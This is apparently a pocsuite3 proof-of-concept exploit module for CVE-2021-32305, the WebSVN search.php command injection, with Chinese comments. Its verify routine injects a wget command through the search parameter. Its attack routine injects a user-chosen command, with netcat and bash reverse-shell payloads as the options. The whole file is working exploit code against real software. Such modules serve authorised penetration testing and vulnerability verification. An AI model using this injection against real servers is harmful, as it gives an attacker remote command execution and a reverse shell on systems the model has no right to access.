from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = 'CVE-2021-32305'  # ssvid
    version = '1.0'
    name = 'WebSVN search.php 远程命令执行漏洞'
    appName = 'WebSVN'
    appVersion = '<2.6.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''WebSVN 2.6.1之前版本存在安全漏洞，该漏洞允许远程攻击者通过搜索参数中的shell元字符执行任意命令。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/search.php?search=%22;wget+http%3A%2F%2Fwww.baidu.com%27;%22"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "http" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        try:
            target = self.url+"/search.php?search=%22;"+cmd+"%27;%22"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 :
                print(r.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)